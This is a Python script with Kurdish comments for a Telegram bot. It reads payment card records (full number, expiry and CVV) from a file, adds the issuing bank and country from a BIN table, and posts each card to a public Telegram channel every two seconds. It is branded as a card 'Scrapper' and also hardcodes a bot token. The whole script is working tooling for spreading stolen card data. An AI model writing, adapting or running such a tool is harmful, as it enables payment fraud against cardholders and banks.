# -*- coding: utf-8 -*-
import asyncio
import os
import random
from telegram import Bot
from telegram.error import TelegramError

# ===== CONFIG =====
BOT_TOKEN = "8839560847:AAF3IeRKYVerZUUHYV_ZgfItdm4BPEhcBYk"
CHANNEL_ID = "@CC428Kurd"
ADMIN_ID = 6395195181
INTERVAL_SECONDS = 2
# ==============================================

# داتای بانک و وڵات بۆ هەر BIN (6 ژمارەی سەرەتا)
BIN_DATABASE = {
    # Visa - India
    "414582": {"bank": "ICICI BANK LTD", "country": "India 🇮🇳"},
    "401717": {"bank": "HDFC Bank", "country": "India 🇮🇳"},
    "519522": {"bank": "HSBC", "country": "India 🇮🇳"},
    # Visa - USA
    "410282": {"bank": "JPMorgan Chase", "country": "USA 🇺🇸"},
    "408139": {"bank": "Bank of America", "country": "USA 🇺🇸"},
    # Mastercard - UK
    "539811": {"bank": "Barclays", "country": "United Kingdom 🇬🇧"},
    "513143": {"bank": "Lloyds Bank", "country": "United Kingdom 🇬🇧"},
    # Visa - Canada
    "418251": {"bank": "Royal Bank of Canada", "country": "Canada 🇨🇦"},
    "406933": {"bank": "Toronto-Dominion Bank", "country": "Canada 🇨🇦"},
    # Mastercard - UAE
    "512252": {"bank": "Emirates NBD", "country": "UAE 🇦🇪"},
    "518414": {"bank": "Abu Dhabi Commercial Bank", "country": "UAE 🇦🇪"},
    # نەگۆڕی باشتر
    "513397": {"bank": "Standard Chartered", "country": "Singapore 🇸🇬"},
    "509431": {"bank": "BNP Paribas", "country": "France 🇫🇷"},
}

def get_card_details(card_number):
    bin_num = card_number[:6]
    if bin_num in BIN_DATABASE:
        return BIN_DATABASE[bin_num]
    # ئەگەر BIN نەناسرا، گەڕانەوە بۆ شتێکی گشتی
    if card_number.startswith('4'):
        return {"bank": "Visa Bank", "country": "International 🌍"}
    elif card_number.startswith('5'):
        return {"bank": "Mastercard Bank", "country": "International 🌍"}
    else:
        return {"bank": "Credit Bank", "country": "International 🌍"}

# خوێندنەوەی کارتەکان
try:
    if os.path.exists('cards.txt'):
        with open('cards.txt', 'r', encoding='utf-8') as f:
            RAW_CARDS = [line.strip() for line in f if line.strip()]
        print(f"✅ Loaded {len(RAW_CARDS)} cards")
    else:
        RAW_CARDS = []
        print("⚠️ cards.txt not found!")
except:
    RAW_CARDS = []

current_index = 0

async def send_card_message(bot, channel, admin):
    global current_index
    
    if not RAW_CARDS:
        await bot.send_message(chat_id=admin, text="❌ No cards in file.")
        return False
    
    card_line = RAW_CARDS[current_index]
    parts = card_line.split('|')
    
    if len(parts) >= 4:
        card_number = parts[0].strip()
        month = parts[1].strip()
        year = parts[2].strip()
        cvv = parts[3].strip()
    else:
        await bot.send_message(chat_id=admin, text=f"❌ Error in: {card_line}")
        current_index += 1
        return False
    
    # دۆزینەوەی زانیاری بانک و وڵات بۆ ئەم کارتە
    details = get_card_details(card_number)
    bank = details['bank']
    country = details['country']
    bin_num = card_number[:6]
    
    text = (
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"● Warnisx Scrapper by @About_Warnisx\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"● CC: {card_number} | {month}/{year} | {cvv}\n"
        f"● BIN: {bin_num}\n"
        f"● Bank: {bank}\n"
        f"● Country: {country}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"Developed By @Warnisx"
    )

    try:
        await bot.send_message(chat_id=channel, text=text)
        await bot.send_message(chat_id=admin, text=f"✅ Sent ({current_index+1}/{len(RAW_CARDS)})")
        print(f"✅ Sent: {card_number}")
        
        current_index += 1
        if current_index >= len(RAW_CARDS):
            current_index = 0  # دەست پێبکەوە لە سەرەتا
        
        return True
    except TelegramError as e:
        await bot.send_message(chat_id=admin, text=f"❌ Error: {e}")
        return False

async def main():
    bot = Bot(token=BOT_TOKEN)
    try:
        bot.get_me()
    except TelegramError:
        print("⚠️ Invalid Token")
        return
    
    while True:
        await send_card_message(bot, CHANNEL_ID, ADMIN_ID)
        await asyncio.sleep(INTERVAL_SECONDS)

if __name__ == "__main__":
    asyncio.run(main())
